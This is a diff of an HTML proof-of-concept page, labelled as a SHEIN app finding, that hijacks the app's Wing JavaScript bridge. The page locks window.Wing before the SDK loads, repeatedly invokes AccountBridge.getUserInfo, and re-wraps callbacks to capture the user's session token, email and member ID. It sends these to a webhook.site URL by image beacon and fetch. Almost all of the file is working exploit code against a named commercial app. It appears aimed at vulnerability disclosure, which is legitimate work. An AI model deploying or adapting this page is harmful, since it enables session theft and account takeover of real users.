@@ -3,65 +3,168 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<title>Loading...</title>
+<title>.shein.com</title>
+<!-- ====================================================================
+     SHEIN v15.4.2 Finding-1 PoC — Wing JS-bridge auth bypass -> ATO.
+     The native side delivers getUserInfo as:  window.Wing.onSuccess(cbId, jsonString)
+     This <head> script claims window.Wing BEFORE SHEIN's SDK can, and locks
+     onSuccess to our capturer. Set EXFIL below to your webhook.
+     ==================================================================== -->
 <script>
 (function () {
-  const WEBHOOK = "https://webhook.site/a2e74a87-48eb-4f59-a564-a554247bfa4b/"; // <-- Update your webhook URL
-
-  window.__beacon = function (data) {
-    try {
-      const payload = typeof data === 'object' ? JSON.stringify(data) : data;
-      navigator.sendBeacon(WEBHOOK, payload);
-    } catch (e) {}
+  window.__EXFIL = "https://webhook.site/a2e74a87-48eb-4f59-a564-a554247bfa4b/";   // <-- YOUR webhook URL
+  window.__logbuf = [];
+  window.__log = function (m) { window.__logbuf.push(m); if (window.__render) window.__render(); };
+  window.__beacon = function (tag, data) {
+    try { new Image().src = window.__EXFIL + (window.__EXFIL.indexOf('?') < 0 ? '?' : '&') +
+          't=' + encodeURIComponent(tag) + '&d=' + encodeURIComponent(typeof data === 'string' ? data : JSON.stringify(data)); } catch (e) {}
+    try { fetch(window.__EXFIL, { method: 'POST', mode: 'no-cors', keepalive: true, body: JSON.stringify({ tag: tag, data: data }) }); } catch (e) {}
   };
-
+  window.__captured = false;
   window.__capture = function (a, b) {
+    window.__log('[cb] a=' + (typeof a === 'string' ? a : JSON.stringify(a)) + '  b=' + (typeof b === 'string' ? b : JSON.stringify(b)));
     var obj = null;
     try { obj = (b && typeof b === 'object') ? b : JSON.parse(b); } catch (e) {}
     if (!obj) { try { obj = (a && typeof a === 'object') ? a : JSON.parse(a); } catch (e) {} }
-    
-    if (obj) {
-      window.__beacon(obj);
-      document.getElementById('status').textContent = "Captured successfully!";
+    if (obj && (obj.token || obj.email || obj.member_id)) {
+      if (window.__captured) return; window.__captured = true;
+      window.__beacon('STOLEN', obj);
+      if (window.__onStolen) window.__onStolen(obj);
     }
   };
 
-  // Pre-emptively define window.Wing to intercept native callbacks
+  // The object SHEIN's native layer will call back into.
   var wing = {
-    onSuccess: function (id, data) { window.__capture(id, data); },
-    onError: function (err) { window.__beacon({ error: err }); },
-    success: function (id, data) { window.__capture(id, data); }
+    onSuccess: function () { window.__capture(arguments[0], arguments[1]); },
+    onError:   function () { window.__log('[onError] ' + Array.prototype.join.call(arguments, ' , ')); },
+    onFailed:  function () { window.__log('[onFailed] ' + Array.prototype.join.call(arguments, ' , ')); },
+    success:   function () { window.__capture(arguments[0], arguments[1]); },
+    callback:  function () { window.__capture(arguments[0], arguments[1]); },
+    callbacks: {}   // some SDK builds dispatch via a map keyed by callbackId
   };
-
   try {
     Object.defineProperty(window, 'Wing', { value: wing, writable: false, configurable: false, enumerable: true });
+    window.__log('[*] window.Wing claimed + locked (SDK cannot overwrite)');
   } catch (e) {
-    window.Wing = wing;
+    try { window.Wing = wing; window.__log('[*] window.Wing assigned (not lockable: ' + e + ')'); }
+    catch (e2) { window.__log('[!] could not set window.Wing: ' + e2); }
   }
 })();
-
-function invokeBridge() {
-  try {
-    // Trigger bridge via prompt
-    prompt('hybrid://AccountBridge:cb1/getUserInfo?{}', 'wing_hybrid:');
-  } catch (e) {}
-}
-
-window.onload = function() {
-  // Fire immediately and retry a couple times if needed
-  invokeBridge();
-  setTimeout(invokeBridge, 1000);
-};
 </script>
 <style>
-  body { font-family: -apple-system, Roboto, sans-serif; background: #111; color: #eee; text-align: center; padding-top: 40px; }
-  .box { padding: 20px; border-radius: 8px; background: #222; display: inline-block; }
+  :root{color-scheme:dark} *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+  body{margin:0;font-family:-apple-system,Roboto,Segoe UI,Arial,sans-serif;background:#0b0f17;color:#e7edf5;padding:16px}
+  h1{font-size:19px;margin:0 0 4px}.sub{color:#8aa0b6;font-size:11px;word-break:break-all;margin-bottom:12px}
+  .status{font-size:14px;padding:10px 12px;border-radius:10px;background:#111826;border:1px solid #1e2a3c;margin-bottom:12px}
+  .ok{color:#34d399}.warn{color:#fbbf24}.err{color:#f87171}
+  .banner{display:none;border-radius:14px;padding:16px;margin:12px 0;background:linear-gradient(135deg,#7f1d1d,#b91c1c);color:#fff;box-shadow:0 8px 30px rgba(185,28,28,.4)}
+  .banner.show{display:block}.banner h2{margin:0 0 10px;font-size:21px}
+  .kv{display:grid;grid-template-columns:92px 1fr;gap:6px 10px;font-size:14px}.kv b{color:#ffe2e2}.kv span{word-break:break-all;font-family:ui-monospace,Menlo,Consolas,monospace}
+  .tok{margin-top:12px;background:rgba(0,0,0,.35);border-radius:10px;padding:10px;font-family:ui-monospace,Menlo,Consolas,monospace;font-size:12px;word-break:break-all}
+  button{width:100%;padding:14px;font-size:16px;font-weight:600;color:#fff;background:#2563eb;border:none;border-radius:12px;margin-top:8px}
+  pre#log{background:#0a0e15;border:1px solid #1a2433;border-radius:10px;padding:10px;font-size:11px;color:#9fb3c8;white-space:pre-wrap;word-break:break-all;max-height:42vh;overflow:auto;margin-top:12px}
 </style>
 </head>
 <body>
-  <div class="box">
-    <h3 id="status">Loading Content...</h3>
-    <button onclick="invokeBridge()" style="padding:10px 20px; margin-top:10px; cursor:pointer;">Retry</button>
+  <h1>Harmless-looking page</h1>
+  <div class="sub" id="origin"></div>
+  <div class="status" id="status">Initializing…</div>
+  <div class="banner" id="banner">
+    <h2>💀 Account exfiltrated</h2>
+    <div class="kv">
+      <b>email</b><span id="email">—</span>
+      <b>member_id</b><span id="mid">—</span>
+      <b>nickname</b><span id="nick">—</span>
+      <b>account</b><span id="acct">—</span>
+    </div>
+    <div class="tok"><b style="color:#ffb4b4">session token:</b><br><span id="token">—</span></div>
   </div>
+  <button onclick="invoke()">Re-run getUserInfo</button>
+  <pre id="log"></pre>
+
+<script>
+var logEl = document.getElementById('log');
+window.__render = function () { logEl.textContent = window.__logbuf.join("\n"); logEl.scrollTop = logEl.scrollHeight; };
+function setStatus(m, c){ var s = document.getElementById('status'); s.textContent = m; s.className = 'status ' + (c || ''); }
+document.getElementById('origin').textContent = location.href;
+window.__log('[*] url=' + location.href);
+window.__render();
+
+window.__onStolen = function (o) {
+  setStatus('Token captured — exfiltrated to webhook.', 'ok');
+  document.getElementById('banner').classList.add('show');
+  document.getElementById('email').textContent = o.email || '—';
+  document.getElementById('mid').textContent   = o.member_id || '—';
+  document.getElementById('nick').textContent  = o.nick_name || '—';
+  document.getElementById('acct').textContent  = o.account_type || '—';
+  document.getElementById('token').textContent = o.token || '—';
+};
+
+/* Diagnostics: dump the REAL shape of window.Wing so we can see what owns onSuccess. */
+function diag() {
+  try {
+    var w = window.Wing, keys = [];
+    for (var k in w) keys.push(k + (typeof w[k] === 'function' ? '()' : ''));
+    var osDesc = '';
+    try { var d = Object.getOwnPropertyDescriptor(w, 'onSuccess');
+          osDesc = d ? ('writable=' + d.writable + ' configurable=' + d.configurable + ' get=' + !!d.get) : 'none'; } catch (e) {}
+    var info = { lockedByUs: window.Wing && window.Wing.onSuccess && (''+window.Wing.onSuccess).indexOf('__capture')>=0,
+                 wingKeys: keys, onSuccessDesc: osDesc,
+                 hasWingBridge: !!(window.WingBridge && window.WingBridge.postMessage),
+                 globals: Object.keys(window).filter(function(x){return /wing|hybrid|jsbridge/i.test(x);}) };
+    window.__log('[diag] ' + JSON.stringify(info));
+    window.__beacon('DIAG', info);
+  } catch (e) { window.__log('[diag err] ' + e); }
+}
+
+/* Backup: if window.Wing was NOT lockable and the SDK replaced it, keep re-wrapping. */
+function rewrap() {
+  try {
+    var w = window.Wing; if (!w) return;
+    ['onSuccess','callback','success','onResult','onFailed'].forEach(function (n) {
+      var cur = w[n]; if (cur && cur.__pwn) return;
+      var orig = cur;
+      var fn = function () { try { window.__capture(arguments[0], arguments[1]); } catch (e) {}
+                             if (typeof orig === 'function') { try { return orig.apply(this, arguments); } catch (e) {} } };
+      fn.__pwn = true;
+      try { w[n] = fn; if (w[n] !== fn) Object.defineProperty(w, n, { configurable:true, writable:true, value:fn }); } catch (e) {}
+    });
+  } catch (e) {}
+}
+setInterval(rewrap, 50);
+
+/* Invoke AccountBridge.getUserInfo. Primary = prompt() dispatch (confirmed working);
+   plus any SDK invoke method, plus the raw WingBridge interface. */
+function invoke() {
+  setStatus('Calling AccountBridge.getUserInfo …', 'warn');
+  rewrap();
+  var uri = 'hybrid://AccountBridge:cb1/getUserInfo?{}';
+  window.__log('[>] prompt ' + uri);
+  var r; try { r = prompt(uri, 'wing_hybrid:'); } catch (e) { window.__log('[!] prompt ' + e); }
+  if (r) { window.__log('[>] sync=' + r); window.__capture('cb1', r); }
+  // register our callback in the SDK map in case it dispatches by id
+  try { if (window.Wing && window.Wing.callbacks) window.Wing.callbacks['cb1'] = function (d) { window.__capture('cb1', d); }; } catch (e) {}
+  // SDK method fallbacks
+  try {
+    var w = window.Wing, names = ['invoke','exec','call','callHandler','postMessage','sendMessage','callNative'];
+    for (var i = 0; i < names.length; i++) if (w && typeof w[names[i]] === 'function') {
+      window.__log('[>] try window.Wing.' + names[i]);
+      try { w[names[i]]('AccountBridge', 'getUserInfo', '{}', function (d) { window.__capture('wcb', d); }); } catch (e) {}
+    }
+  } catch (e) {}
+  // raw native interface
+  try { if (window.WingBridge && window.WingBridge.postMessage)
+    window.WingBridge.postMessage(JSON.stringify({ className:'AccountBridge', methodName:'getUserInfo', params:'{}', callbackId:'cb1' })); } catch (e) {}
+}
+
+setTimeout(diag, 800);
+setTimeout(diag, 2500);
+var n = 0;
+(function fire() {
+  invoke();
+  if (!window.__captured && n++ < 8) setTimeout(fire, 700);
+  else if (!window.__captured) setStatus('No PII callback captured. See [diag] lines — paste them to adjust. (logged in? URL has .shein.com/ ?)', 'err');
+})();
+</script>
 </body>
 </html>
